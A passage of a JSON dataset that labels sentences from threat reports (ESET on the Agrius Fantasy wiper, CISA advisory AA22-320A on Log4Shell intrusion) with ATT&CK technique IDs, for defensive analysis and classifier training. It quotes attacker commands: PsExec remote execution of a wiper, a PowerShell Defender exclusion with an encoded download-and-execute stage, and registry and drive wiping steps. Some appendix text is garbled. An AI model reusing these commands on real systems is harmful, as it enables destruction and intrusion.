            "Victims in Israel include an IT support services company, a diamond wholesaler, and an HR consulting firm.",
            "South African victims are from a single organization in the diamond industry, with the Hong Kong victim being a jeweler. ",
            "Figure 1.",
            "Victim timeline and locations ",
            "The campaign lasted less than three hours and within that timeframe ESET customers were already protected with detections identifying Fantasy as a wiper, and blocking its execution.",
            "We observed the software developer pushing out clean updates within a matter of hours of the attack.",
            "We reached out to the software developer to notify them about a potential compromise, but our enquiries went unanswered. ",
            "Preparing for departure The first tools deployed by Agrius operators to victim systems, through means unknown, were: MiniDump, \u201ca C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumps\u201d SecretsDump, a Python script that \u201cperforms various techniques to dump hashes from [a] remote machine without executing any agent there\u201d Host2IP, a custom C#/.NET tool that resolves a hostname to an IP address. ",
            "Usernames, passwords, and hostnames collected by these tools are required for Sandals to successfully spread and execute the Fantasy wiper.",
            "Agrius operators deployed MiniDump and SecretsDump to this campaign\u2019s first victim on February 20th, 2022, but waited until March 12th, 2022 to deploy Host2IP, Fantasy, and Sandals (consecutively). ",
            "Sandals: Igniting the Fantasy (wiper) ",
            "Sandals is a 32-bit Windows executable written in C#/.NET.",
            "We chose the name because Sandals is an anagram of some of the command line arguments it accepts.",
            "It is used to connect to systems in the same network via SMB, to write a batch file to disk that executes the Fantasy wiper, and then run that batch file via PsExec with this command line string: ",
            "PsExec.exe /accepteula -d -u \u201c<username>\u201d",
            "-p \u201c<password>\u201d",
            "-s \u201cC:\\<path>\\<GUID>.bat\u201d The PsExec options have the following meanings: -d \u2013 Don\u2019t wait for process to terminate (non-interactive). ",
            "/accepteula \u2013 Suppress display of the license dialog. ",
            "-s \u2013",
            "Run the remote process in the SYSTEM account. ",
            "Sandals does not write the Fantasy wiper to remote systems.",
            "We believe that the Fantasy wiper is deployed via a supply-chain attack using the software developer\u2019s software update mechanism.",
            "This assessment is based on several factors: all victims were customers of the affected software developer; the Fantasy wiper was named in a similar fashion to legitimate versions of the software; all victims executed the Fantasy wiper within a 2.5 hour timeframe, where victims in South Africa were targeted first, then victims in Israel, and finally victims in Hong Kong (we attribute the delay in targeting to time zone differences and a hardcoded check-in time within the legitimate software); and, lastly, the Fantasy wiper was written to, and executed from, %SYSTEM%\\Windows\\Temp, the default temp directory for Windows systems. ",
            "Additionally, we believe the victims were already using PsExec, and Agrius operators chose to use PsExec to blend into typical administrative activity on the victims\u2019 machines, and for ease of batch file execution.",
            "Table 1 lists the command line arguments accepted by Sandals. ",
            "Table 1.",
            "Sandals arguments and their descriptions ArgumentDescriptionRequired -f",
            "<filepath>",
            "A path and filename to a file that contains a list of hostnames that should be targeted.",
            "Yes -u <username>",
            "The username that will be used to log into the remote hostname(s) in argument -f.",
            "Yes -p <password>The username that will be used to log into the remote hostname(s) in argument -f.",
            "Yes -l <filepath>The path and filename of the Fantasy wiper on the remote system that will be executed by the batch file created by Sandals.",
            "Yes -d <path>",
            "The location to which Sandals will write the batch file on the remote system.",
            "Default location is %WINDOWS%\\Temp.",
            "No -s",
            "<integer>",
            "The amount of time, in seconds, that Sandals will sleep between writing the batch file to disk and executing.",
            "The default is two seconds.",
            "No -a file <filepath> or-a random or-a rsaIf -a is followed by the word file and a path and filename, Sandals uses the encryption key in the supplied file.",
            "If -a is followed by rsa or random, Sandals uses the RSACryptoServiceProvider class to generate a public-private key pair with a key size of 2,048.",
            "No -dn <devicename>Specifies which drive to connect with on a remote system over SMB.",
            "Default is C:.No -ps <filepath>Location of PsExec on disk.",
            "Default is psexec.exe in the current working directory.",
            "No -raIf -ra is supplied at runtime, it sets the variable flag to True (initially set to False).",
            "If flag=True, Sandals deletes all files written to disk in the current working directory.",
            "If flag=False, Sandals skips the file cleanup step.",
            "No The batch file written to disk by Sandals is named <GUID>.bat, where the filename is the output of the Guid.",
            "NewGuid() method.",
            "An example of a Sandals batch file is shown in Figure 2. ",
            "Figure 2.",
            "Sandals batch file (top, in red) and the decoded command line parameter (bottom, in blue) ",
            "The base64 string that follows fantasy35.exe is likely a relic of the execution requirements of Apostle (more details in the Attribution to Agrius section).",
            "However, the Fantasy wiper only looks for an argument of 411 and ignores all other runtime input (see the next section for more information). ",
            "Fantasy wiper The Fantasy wiper is also a 32-bit Windows executable written in C#/.NET, so named for its filenames: fantasy45.exe and fantasy35.exe, respectively.",
            "Figure 3 depicts the execution flow of the Fantasy wiper. ",
            "Figure 3.",
            "Fantasy wiper execution flow Initially, Fantasy creates a mutex to ensure that only one instance is running.",
            "It collects a list of fixed drives but excludes the drive where the %WINDOWS% directory exists.",
            "Then it enters a for loop iterating over the drive list to build a recursive directory listing, and uses the RNGCryptoServiceProvider.",
            "GetBytes method to create a cryptographically strong sequence of random values in a 4096-byte array.",
            "If a runtime argument of 411 is supplied to the wiper, the for loop overwrites the contents of every file with the aforementioned byte array using a nested while loop.",
            "Otherwise, the for loop only overwrites files with a file extension listed in the Appendix. ",
            "Fantasy then assigns a specific timestamp (2037-01-01 00:00:00) to these file timestamp properties: CreationTime LastAccessTime LastWriteTime CreationTimeUtc SetLastAccessTimeUtc LastWriteTimeUtc and then deletes the file.",
            "This is presumably done to make recovery and forensic analysis more difficult. ",
            "During the for loop, the Fantasy wiper counts errors within the current directory when attempting to overwrite files.",
            "If the number of errors exceeds 50, it writes a batch file, %WINDOWS%\\Temp\\<GUID>.bat, that deletes the directory with the files causing the errors, and then self-deletes.",
            "File wiping then resumes in the next directory in the target list. ",
            "Once the for loop completes, the Fantasy wiper creates a batch file in %WINDOWS%\\Temp called registry.bat.",
            "The batch file deletes the following registry keys: HKCR\\.EXE HKCR\\.dll HKCR\\* Then it runs the following to attempt to clear file system cache memory: ",
            "%windir%\\system32\\rundll32.exe advapi32.dll,ProcessIdleTasks Lastly, registry.bat deletes itself (del %0). ",
            "Next, the Fantasy wiper clears all Windows event logs and creates another batch file, system.bat, in %WINDOWS%\\Temp, that recursively deletes all files on %SYSTEMDRIVE%, attempts to clear file system cache memory, and self-deletes.",
            "Then Fantasy sleeps for two minutes before overwriting the system\u2019s Master Boot Record. ",
            "Fantasy then writes another batch file, %WINDOWS%\\Temp\\remover.bat, that deletes the Fantasy wiper from disk and then deletes itself.",
            "Then Fantasy wiper sleeps for 30 seconds before rebooting the system with reason code SHTDN_REASON_MAJOR_OTHER (0x00000000) \u2014 Other issue. ",
            "It is likely that %SYSTEMDRIVE% recovery is possible.",
            "Victims were observed to be back up and running within a matter of hours. ",
            "Attribution to Agrius Much of the code base from Apostle, initially a wiper masquerading as ransomware then updated to actual ransomware, was directly copied to Fantasy and many other functions in Fantasy were only slightly modified from Apostle, a known Agrius tool.",
            "However, the overall functionality of Fantasy is that of a wiper without any attempt to masquerade as ransomware.",
            "Figure 4 shows the file deletion functions in Fantasy and Apostle, respectively.",
            "There are only a few small tweaks between the original function in Apostle and the Fantasy implementation. ",
            "Figure 4.",
            "File deletion functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green) Figure 4.",
            "File deletion functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green) Figure 5 shows that the directory listing function is almost a direct copy, with only the function variables getting a slight tweak between Apostle and Fantasy. ",
            "Figure 5.",
            "Directory listing functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green) ",
            "Finally, the GetSubDirectoryFileListRecursive function in Figure 6 is also almost an exact copy. ",
            "Figure 6.",
            "Recursive directory listing functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green) ",
            "In addition to the code reuse, we can see remnants of the Apostle execution flow in Fantasy.",
            "In the original analysis of Apostle, SentinelOne notes that \u201cProper execution of the ransomware version requires supplying it with a base64 encoded argument containing an XML of an \u2018RSAParameters\u2019 object.",
            "This argument is passed on and saved as the Public Key used for the encryption process and is most likely generated on a machine owned by the threat actor.\u201d",
            "We can see in the batch file in Figure 7, which Sandals creates on remote systems to launch Fantasy, that the same base64-encoded argument containing an XML of an RSAParameters object is passed to Fantasy at runtime.",
            "Fantasy, however, does not use this runtime argument. ",
            "Figure 7.",
            "Sandals passing to Fantasy the same RSAParameters object as was used by Apostle ransomware Conclusion Since its discovery in 2021, Agrius has been solely focused on destructive operations.",
            "To that end, Agrius operators probably executed a supply-chain attack by targeting an Israeli software company\u2019s software updating mechanisms to deploy Fantasy, its newest wiper, to victims in Israel, Hong Kong, and South Africa.",
            "Fantasy is similar in many respects to the previous Agrius wiper, Apostle, that initially masqueraded as ransomware before being rewritten to be actual ransomware.",
            "Fantasy makes no effort to disguise itself as ransomware.",
            "Agrius operators used a new tool, Sandals, to connect remotely to systems and execute Fantasy. ",
            "For any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com. ",
            "ESET Research also offers private APT intelligence reports and data feeds.",
            "For any inquiries about this service, visit the ESET Threat Intelligence page. ",
            "IoCs SHA-1FilenameDetectionDescription 1A62031BBB2C3F55D44F59917FD32E4ED2041224fantasy35.exeMSIL/KillDisk.",
            "IFantasy wiper. ",
            "820AD7E30B4C54692D07B29361AECD0BB14DF3BEfantasy45.exeMSIL/KillDisk.",
            "1AAE62ACEE3C04A6728F9EDC3756FABD6E342252host2ip.execleanResolves a hostname to an IP address. ",
            "5485C627922A71B04D4C78FBC25985CDB163313BMiniDump.exeMSIL/Riskware.",
            "LsassDumper.",
            "HImplementation of Mimikatz minidump that dumps credentials from LSASS. ",
            "DB11CBFFE30E0094D6DE48259C5A919C1EB57108registry.batBAT/Agent.",
            "NRGBatch file that wipes some registry keys and is dropped and executed by the Fantasy wiper. ",
            "3228E6BC8C738781176E65EBBC0EB52020A44866secretsdump.pyPython/Impacket.",
            "APython script that dumps credential hashes. ",
            "B3B1EDD6B80AF0CDADADD1EE1448056E6E1B3274spchost.exeMSIL/Agent.",
            "XHSandals lateral movement tool and Fantasy spreader. ",
            "MITRE ATT&CK techniques This table was built using version 12 of the MITRE ATT&CK framework. ",
            "TacticIDNameDescription Resource DevelopmentT1587Develop CapabilitiesAgrius builds utility tools to use during an active exploitation process. ",
            "T1587.001Develop Capabilities: MalwareAgrius builds custom malware including wipers (Fantasy) and lateral movement tools (Sandals). ",
            "Initial AccessT1078.002Valid Accounts: Domain AccountsAgrius operators attempted to capture cached credentials and then use them for lateral movement. T1078.003Valid Accounts: Local AccountsAgrius operators attempted to use cached credentials from local accounts to gain initial access to additional systems within an internal network. ",
            "ExecutionT1059.003Command and Scripting Interpreter:",
            "Windows Command ShellFantasy and Sandals both use batch files that run via the Windows command shell. Privilege EscalationT1134Access Token ManipulationFantasy uses the LookupPrivilegeValue and AdjustTokenPrivilege APIs in advapi32.dll to grant its process token the SeShutdownPrivilege to reboot Windows. ",
            "Defense EvasionT1070.006Indicator Removal on Host: TimestompAgrius operators timestomped the compilation timestamps of Fantasy and Sandals. ",
            "Credential AccessT1003OS Credential DumpingAgrius operators used several tools to dump OS credentials for use in lateral movement. ",
            "DiscoveryT1135Network Share DiscoveryAgrius operators used cached credentials to check for access to other systems within an internal network. ",
            "Lateral MovementT1021.002Remote Services: SMB/Windows Admin SharesAgrius operators used cached credentials to connect over SMB to systems within an exploited internal network. ",
            "T1570Lateral Tool TransferAgrius operators used Sandals to push batch files over SMB to other systems within an internal network. ",
            "ImpactT1485Data DestructionThe Fantasy wiper overwrites data in files and then deletes the files. ",
            "T1561.002Disk WipeFantasy wipes the MBR of the Windows drive and attempts to wipe the OS partition. ",
            "T1561.001Disk Wipe: Disk Content WipeFantasy wipes all disk contents from non-Windows drives that are fixed drives. ",
            "T1529System Shutdown/RebootFantasy reboots the system after completing its disk and data wiping payloads. ",
            "Appendix File extensions (682) targeted by Fantasy wiper when not targeting all file extensions.",
            "File extensions highlighted in yellow (68) are common filename extensions in Windows.",
            "Notably absent are file extensions dll and sys. $$$blenddrwjspnyfqualsoftcodetdb $dbblend1dsbkb2oabquicken2015backuptex 001blend2dsskbxobjquicken2016backuptga 002blobdtdkc2obkquicken2017backupthm 003bm3dwgkdbodbquickenbackuptib 113bmkdxbkdbxodcqv~tibkp 3dmbookexportdxfkdcodfr3dtif 3dsbpadxgkeyodgraftig 3frbpbem1kfodmrartis 3g2bpmepkkpdxodprattlg 3gpbpnepslayoutodsrawtmp 3prbpserbsqllbfodtrbtmr 73bbpwerflcboebrbctor 7zbsaesmldabakoggrbftrn __abupexelitemodoilrbkttbk __bcexfllxoldrbstxt abcaafbclnkonepkgrdbuci ab4casfbfltxorfre4upk abacbkfbkluaorirgss3av2i abbucbsfbulvlorigrimvb abfcbufbwmostrmvbk abkcdffdbm2otgrmbakvbm abucdrffm3uothrmgbvbox-prev abu1cdr3ffdm4aotproflvcf accdbcdr4fffm4votsrrrvdf accdecdr5fhmapottrtfvfs0 accdrcdr6fhdmaxoyxrw2vmdk accdtcdrwfhfmbfp12rwlvob achcdxflambkp7brwzvpcbackup acpce2flatmbwp7cs3dbvpk acrcelflkamcmetapabsafenotebackupvpp_pc actcenon~flkbmdbpagessas7bdatvrb adbcerflvmdbackuppaksavvtf adicfpfmbmdcpaqsayw01 adscfrforgemddatapassbw3x aeacgmfosmdfpatsbbwallet aficibfpkmdinfopbasbswalletx agdlck9fpsxmefpbbsbuwar aiclassfpxmempbdsdOwav aitclsfshmenupbfsdawb2 alcmfftmbmfwpbjsdcwbb apjcmtfulmigpblsdfwbcat apkconfigfwbackupmkvpbx5scriptsidwbk arccpifxgmlxpbxscriptsiddwbx arch00cppfzammwpcdsidnwin arwcr2fzbmoneywellpctsiewjf as4crawgb1mospdbsimwma asdcrdsgb2movpddsiswmo asfcrtgbpmp3pdfskbwmv ashbakcrwgdbmp4pefsldmwotreplay asmcsghompbpemsldxwpb asmxcsdghsmpegpfislmwpd aspcshgraympgpfxslnwps aspxcslgreympqgephpsmewspak assetcsmgrymrwphp5sn1wxwanam asvcssgs-bckmrwrefphtmlsn2x asvxcsvgzmsgpk7snax11 asxd3dbsphmsipkpasssnsx3f ateda0hbkmsimplsnxxbk atidachkdbmv_plcspfxf avidashkxmydplcspgxis awgdashhplgmynotesbackuppngspixla ba6daziphppnb7potspsxlam ba7dbhtmnbapotmsqbxlk ba8db-journalhtm1nbakpotxsqlxlm ba9db0htmlnbdppamsqlitexlr bacdb3hvplnbdppssqlite3xls backdbaibanknbfppsmsqlitedbxlsb backupdbfibdnbippsxsr2xlsm backup1dbkibknbkpptsrfxlsx backupdbdbsibznbspptmsrrxlt bakdbxicbunbupptxsrtxltm bak2dc2icfncfpqb-backupsrwxltx bak3dcricxsncoprfst4xlw bakxdcsidxndprvst6xml bak~dddiifndapsst7ycbcra bankddociiqnddpsast8yrcbck barddrwincpasnefpsafe3stdyuv batddsinddnfbpsdstgzbfx bayderindexnfcpskstizip bbbdesinprogressnk2pspimagestwztmp bbzdescipdnoppststx~cw bc6designisonoyptbsty bc7dgcitdbnpfptxsum bckdimitlnpspvcsv$ bckpdivxitmnrbakpvhdsv2i bcmdiyiv2inrspysvg bdbdjvuiwdnrwqbaswf bffdmpiwins2qbbsxc bgtdnaj01ns3qbksxd bifdngjarns4qbmsxg bifxdocjavansdqbmbsxi bigdocmjbknsfqbmdsxm bikdocxjdcnsgqbrsxw bk1dotjpanshqbwsyncdb bkcdotmjpentlqbxt12 bkfdotxjpegnwbqbyt13 bkpdovjpgnwbakqdftar bkupdpbjpsnx2qictax bkzdrfjsnxlqsftbk 7 Dec 2022 - 11:30AM "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1190"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1003.001",
                "T1033"
            ],
            [
                "T1033",
                "T1082"
            ],
            [],
            [],
            [],
            [],
            [
                "T1570",
                "T1059.003"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1059.003"
            ],
            [
                "T1059.003"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1059.003"
            ],
            [],
            [],
            [],
            [
                "T1059.003"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1070.004"
            ],
            [],
            [
                "T1059.003"
            ],
            [],
            [],
            [],
            [
                "T1027",
                "T1140"
            ],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1083"
            ],
            [
                "T1083"
            ],
            [],
            [],
            [],
            [
                "T1070.004"
            ],
            [],
            [],
            [
                "T1027",
                "T1059.003",
                "T1070.004"
            ],
            [],
            [
                "T1059.003",
                "T1112"
            ],
            [
                "T1059.003",
                "T1218.011",
                "T1112"
            ],
            [
                "T1027",
                "T1218.011"
            ],
            [
                "T1027",
                "T1059.003",
                "T1070.004"
            ],
            [],
            [
                "T1027",
                "T1059.003"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1070.004"
            ],
            [],
            [],
            [
                "T1070.004"
            ],
            [
                "T1083",
                "T1070.004"
            ],
            [],
            [
                "T1083"
            ],
            [
                "T1083",
                "T1106"
            ],
            [],
            [
                "T1083"
            ],
            [],
            [
                "T1027"
            ],
            [],
            [
                "T1027",
                "T1059.003"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [],
            [
                "T1106",
                "T1059.003"
            ],
            [],
            [],
            [],
            [],
            [
                "T1570"
            ],
            [
                "T1070.004"
            ],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "AA22320A Iranian GovernmentSponsored APT Actors Compromise Federal Network Deploy Crypto Miner Credential Harvester",
        "cti_report": [
            "title: AA22-320A: Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy Crypto Miner, Credential Harvester url: https://us-cert.cisa.gov/ncas/alerts/aa22-320a Original release date: November 16, 2022 | Last revised: November 25, 2022SummaryFrom mid-June through mid-July 2022, CISA conducted an incident response engagement at a Federal Civilian Executive Branch (FCEB) organization where CISA observed suspected advanced persistent threat (APT) activity.",
            "In the course of incident response activities, CISA determined that cyber threat actors exploited the Log4Shell vulnerability in an unpatched VMware Horizon server, installed XMRig crypto mining software, moved laterally to the domain controller (DC), compromised credentials, and then implanted Ngrok reverse proxies on several hosts to maintain persistence.",
            "CISA and the Federal Bureau of Investigation (FBI) assess that the FCEB network was compromised by Iranian government-sponsored APT actors. ",
            "CISA and FBI are releasing this Cybersecurity Advisory (CSA) providing the suspected Iranian government-sponsored actors\u2019 tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help network defenders detect and protect against related compromises. ",
            "CISA and FBI encourage all organizations with affected VMware systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities.",
            "If suspected initial access or compromise is detected based on IOCs or TTPs described in this CSA, CISA and FBI encourage organizations to assume lateral movement by threat actors, investigate connected systems (including the DC), and audit privileged accounts.",
            "All organizations, regardless of identified evidence of compromise, should apply the recommendations in the Mitigations section of this CSA to protect against similar malicious cyber activity. ",
            "For more information on Iranian government-sponsored Iranian malicious cyber activity, see CISA\u2019s Iran Cyber Threat Overview and Advisories webpage and FBI\u2019s Iran Threats webpage. ",
            "Download the PDF version of this report: pdf, 528 kb. ",
            "For a downloadable copy of the Malware Analysis Report (MAR) accompanying this report, see: MAR 10387061-1.v1. ",
            "For a downloadable copy of IOCs, see: AA22-320A.stix, 1.55 mb. ",
            "Technical DetailsNote: This advisory uses the MITRE ATT&CK for Enterprise framework, version 11.",
            "See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors\u2019 activity mapped to MITRE ATT&CK:registered: tactics and techniques with corresponding mitigation and/or detection recommendations. ",
            "Overview In April 2022, CISA conducted retrospective analysis using EINSTEIN\u2014an FCEB-wide intrusion detection system (IDS) operated and monitored by CISA\u2014and identified suspected APT activity on an FCEB organization\u2019s network.",
            "CISA observed bi-directional traffic between the network and a known malicious IP address associated with exploitation of the Log4Shell vulnerability (CVE-2021-44228) in VMware Horizon servers.",
            "In coordination with the FCEB organization, CISA initiated threat hunting incident response activities; however, prior to deploying an incident response team, CISA observed additional suspected APT activity.",
            "Specifically, CISA observed HTTPS activity from IP address to the organization\u2019s VMware server.",
            "Based on trusted third-party reporting, is a Lightweight Directory Access Protocol (LDAP) server associated with threat actors exploiting Log4Shell.",
            "Following HTTPS activity, CISA observed a suspected LDAP callback on port 443 to this IP address.",
            "CISA also observed a DNS query for that resolved back to when the victim server was returning this Log4Shell LDAP callback to the actors\u2019 server. ",
            "CISA assessed that this traffic indicated a confirmed compromise based on the successful callback to the indicator and informed the organization of these findings; the organization investigated the activity and found signs of compromise.",
            "As trusted-third party reporting associated Log4Shell activity from with lateral movement and targeting of DCs, CISA suspected the threat actors had moved laterally and compromised the organization\u2019s DC. From mid-June through mid-July 2022, CISA conducted an onsite incident response engagement and determined that the organization was compromised as early as February 2022, by likely Iranian government-sponsored APT actors who installed XMRig crypto mining software.",
            "The threat actors also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse proxies. ",
            "Threat Actor Activity In February 2022, the threat actors exploited Log4Shell [T1190] for initial access [TA0001] to the organization\u2019s unpatched VMware Horizon server.",
            "As part of their initial exploitation, CISA observed a connection to known malicious IP address lasting 17.6 seconds. ",
            "The actors\u2019 exploit payload ran the following PowerShell command [T1059.001] that added an exclusion rule to",
            "Windows Defender",
            "[T1562.001]: powershell try{Add-MpPreference -ExclusionPath 'C:\\'; Write-Host 'added-exclusion'} catch {Write-Host 'adding-exclusion-failed' }; powershell -enc \"$BASE64 encoded payload to download next stage and execute it\" The exclusion rule allowlisted the entire , enabling threat actors to download tools to the without virus scans.",
            "The exploit payload then downloaded from to [T1105].",
            "When executed, mde.ps1 downloaded from and removed from the disk [T1070.004]. contained XMRig cryptocurrency mining software and associated configuration files. ",
            "\u2013 XMRig Miner driver \u2013 XMRig Miner \u2013 XMRig miner configuration \u2013 Associated file.",
            "This file can create a local user account",
            "[T1136.001] and tests for internet connectivity by pinging [T1016.001].",
            "The exploit payload created a Scheduled Task",
            "[T1053.005] that executed daily as .",
            "Note:",
            "By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access.",
            "The Scheduled Task was named to masquerade as a legitimate Windows task. ",
            "See MAR 10387061-1.v1 for additional information, including IOCs, on these four files. ",
            "After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account ",
            "[T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host.",
            "Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from server associated with .",
            "The actors downloaded the following tools: PsExec \u2013 a Microsoft signed tool for system administrators. ",
            "Mimikatz \u2013 a credential theft tool. ",
            "Ngrok \u2013 a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at .",
            "CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments.",
            "Ngrok is known to be used for malicious purposes.[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account",
            "[T1136.002].",
            "Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.",
            "Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.",
            "The threat actors were able to implant Ngrok on multiple hosts to ensure Ngrok\u2019s persistence should they lose access to a machine during a routine reboot.",
            "The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to and (the prior domain in reverse).",
            "It is possible, but was not observed, that the threat actors configured a custom domain, or used other Ngrok tunnel domains, wildcarded here as , , , or . ",
            "Once the threat actors established a deep foothold in the network and moved laterally to the domain controller, they executed the following PowerShell command on the Active Directory to obtain a list of all machines attached to the domain [T1018]: Powershell.exe get-adcomputer -filter * -properties * | select name,operatingsystem,ipv4address &gt; The threat actors also changed the password for the local administrator account",
            "[T1098] on several hosts as a backup should the rogue domain administrator account get detected and terminated.",
            "Additionally, the threat actor was observed attempting to dump the Local Security Authority Subsystem Service (LSASS) process [T1003.001] with task manager but this was stopped by additional anti-virus the FCEB organization had installed. MITRE ATT&CK TACTICS AND TECHNIQUES See table 1 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations.",
            "For additional mitigations, see the Mitigations section. ",
            "Table 1: Cyber Threat Actors ATT&CK Techniques for Enterprise Initial Access Technique Title ID Use Recommendations Exploit Public-Facing Application T1190 The actors exploited Log4Shell for initial access to the organization\u2019s VMware Horizon server. ",
            "Mitigation/Detection: Use a firewall or web-application firewall and enable logging to prevent and detect potential Log4Shell exploitation attempts [M1050]. ",
            "Mitigation: Perform regular vulnerability scanning to detect Log4J vulnerabilities and update Log4J software using vendor provided patches",
            "[M1016],[M1051]. Execution Technique Title ID Use Recommendation Command and Scripting Interpreter: PowerShell T1059.001 The actors ran PowerShell commands that added an exclusion rule to Windows Defender. ",
            "The actors executed PowerShell on the AD to obtain a list of machines on the domain. ",
            "Mitigation: Disable or remove PowerShell for non-administrative users [M1042],[M1026] or enable code-signing to execute only signed scripts [M1045]. ",
            "Mitigation: Employ anti-malware to automatically detect and quarantine malicious scripts [M1049]. ",
            "Persistence Technique Title ID Use Recommendations Account Manipulation T1098 The actors changed the password for the local administrator account on several hosts. ",
            "Mitigation: Use multifactor authentication for user and privileged accounts [M1032]. Detection:",
            "Monitor events for changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728, and 4670.",
            "Monitor for modification of accounts in correlation with other suspicious activity [DS0002]. ",
            "Create Account: Local Account T1136.001 ",
            "The actors\u2019 malware can create local user accounts. ",
            "Mitigation: Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts. ",
            "Detection:",
            "Monitor executed commands and arguments for actions that are associated with local account creation, such as net user /add , useradd, and dscl -create",
            "[DS0017]. Detection:",
            "Enable logging for new user creation",
            "[DS0002]. Create Account:",
            "Domain Account T1136.002 ",
            "The actors used Mimikatz to create a rogue domain administrator account. ",
            "Enable logging for new user creation, especially domain administrator accounts",
            "[DS0002]. Scheduled Task/Job: Scheduled Task T1053.005 ",
            "The actors\u2019 exploit payload created Scheduled Task RuntimeBrokerService.exe, which executed RuntimeBroker.exe daily as SYSTEM. ",
            "Mitigation: Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM",
            "[M1028]. Detection:",
            "Monitor for newly constructed processes and/or command-lines that execute from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows [DS0009] Detection:",
            "Monitor for newly constructed scheduled jobs by enabling the Microsoft-Windows-TaskScheduler/Operational setting within the event logging service",
            "[DS0003]. Valid Accounts: Default Accounts T1078.001 ",
            "The actors used built-in Windows user account DefaultAccount. ",
            "Mitigation: Change default usernames and passwords immediately after the installation and before deployment to a production environment [M1027]. Detection:",
            "Develop rules to monitor logon behavior across default accounts that have been activated or logged into [DS0028]. Defense Evasion Technique Title ID Use Recommendations Impair Defenses: Disable or Modify Tools T1562.001 ",
            "The actors added an exclusion rule to Windows Defender.",
            "The tool allowlisted the entire c:\\drive, enabling the actors to bypass virus scans for tools they downloaded to the c:\\drive. ",
            "The actors manually disabled Windows Defender via the GUI. ",
            "Mitigation: Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services.",
            "[M1018]. Detection:",
            "Monitor for changes made to Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender",
            "[DS0024]. Detection:",
            "Monitor for telemetry that provides context for modification or deletion of information related to security software processes or services such as Windows Defender definition files in Windows and System log files in Linux [DS0013]. Detection:",
            "Monitor processes for unexpected termination related to security tools/services [DS0009]. ",
            "Indicator Removal on Host: File Deletion T1070.004 ",
            "The actors removed malicious file mde.ps1 from the dis. Detection:",
            "Monitor executed commands and arguments for actions that could be utilized to unlink, rename, or delete files [DS0017]. Detection:",
            "Monitor for unexpected deletion of files from the system [DS0022]. ",
            "Credential Access Technique Title ID Use Recommendations OS Credential Dumping: LSASS Memory T1003.001 ",
            "The actors were observed trying to dump LSASS process. ",
            "Mitigation: With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping [M1043] Mitigation: On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing [M1040]. ",
            "Mitigation: Ensure that local administrator accounts have complex, unique passwords across all systems on the network [M1027]. Detection:",
            "Monitor for unexpected processes interacting with LSASS.exe. ",
            "Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored.",
            "[DS0009]. Detection:",
            "Monitor executed commands and arguments that may attempt to access credential material stored in the process memory of the LSASS",
            "[DS0017]. Credentials from Password Stores T1555 The actors used Mimikatz to harvest credentials. ",
            "Mitigation: Organizations may consider weighing the risk of storing credentials in password stores and web browsers.",
            "If system, software, or web browser credential disclosure is a significant concern, technical controls, policy, and user training may be used to prevent storage of credentials in improper locations [M1027]. ",
            "Monitor for processes being accessed that may search for common password storage locations to obtain user credentials [DS0009]. ",
            "Monitor executed commands and arguments that may search for common password storage locations to obtain user credentials [DS0017]. ",
            "Discovery Technique Title ID Use Recommendations Remote System Discovery T1018 ",
            "The actors executed a PowerShell command on the AD to obtain a list of all machines attached to the domain. ",
            "Monitor executed commands and arguments that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement [DS0017]. Detection:",
            "Monitor for newly constructed network connections associated with pings/scans that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement [DS0029]. ",
